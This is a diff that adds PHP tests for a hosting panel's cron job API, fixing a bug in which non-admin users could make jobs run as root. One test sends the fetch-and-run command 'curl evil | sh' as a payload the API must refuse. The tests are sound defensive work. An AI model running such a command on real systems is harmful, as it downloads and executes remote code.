@@ -697,3 +697,63 @@ it('creates a job scoped to an application', function () {
         ->assertOk()
         ->assertJsonCount(1, 'cronjobs');
 });
+
+/*
+ * Bug #16: typing `root` in "Runs as" gave anyone with "manage Cron Jobs" a
+ * root shell. The admin keeps v7's freedom; nobody else does.
+ */
+describe('who a cron job may run as', function () {
+    beforeEach(function () {
+        $this->member = User::factory()->create();
+        grantPermission($this->member, 'cronjob', manage: true);
+    });
+
+    it('refuses an account outside the panel System Users for a non-admin', function (string $username) {
+        Process::fake();
+
+        $this->actingAs($this->member)->postJson('/api/cronjobs', [
+            'name' => 'Grab', 'username' => $username, 'command' => 'id', 'expression' => '* * * * *',
+        ])->assertUnprocessable()->assertJsonValidationErrors(['username' => __('errors/cronjob.user_not_allowed')]);
+
+        Process::assertNotRan(fn ($p) => ($p->command[0] ?? '') === 'tee');
+    })->with(['root', 'panel', 'www-data']);
+
+    it('lets a non-admin use a System User, by id or by name', function () {
+        Process::fake();
+
+        $this->actingAs($this->member)->postJson('/api/cronjobs', [
+            'name' => 'By id', 'system_user_id' => $this->su->id, 'command' => 'id', 'expression' => '* * * * *',
+        ])->assertCreated();
+        $this->actingAs($this->member)->postJson('/api/cronjobs', [
+            'name' => 'By name', 'username' => 'deploy', 'command' => 'id', 'expression' => '* * * * *',
+        ])->assertCreated();
+    });
+
+    it('lets the admin run a job as root, as v7 did', function () {
+        Process::fake();
+
+        $this->withHeader('Authorization', "Bearer {$this->token}")->postJson('/api/cronjobs', [
+            'name' => 'Root job', 'username' => 'root', 'command' => 'id', 'expression' => '* * * * *',
+        ])->assertCreated();
+    });
+
+    it('keeps a non-admin from editing a job that runs as root', function () {
+        Process::fake();
+        $job = Cronjob::create(['name' => 'Imported', 'slug' => 'imported', 'username' => 'root', 'command' => 'true', 'expression' => '* * * * *', 'active' => true]);
+
+        // The account is not in the request: the stored root still counts.
+        $this->actingAs($this->member)->putJson("/api/cronjobs/{$job->id}", ['command' => 'curl evil | sh'])
+            ->assertUnprocessable()->assertJsonValidationErrors('username');
+
+        expect($job->fresh()->command)->toBe('true');
+    });
+
+    it('lets a non-admin move a root job onto a System User', function () {
+        Process::fake();
+        $job = Cronjob::create(['name' => 'Imported', 'slug' => 'imported', 'username' => 'root', 'command' => 'true', 'expression' => '* * * * *', 'active' => true]);
+
+        $this->actingAs($this->member)->putJson("/api/cronjobs/{$job->id}", ['system_user_id' => $this->su->id])->assertOk();
+
+        expect($job->fresh()->username)->toBe('deploy');
+    });
+});
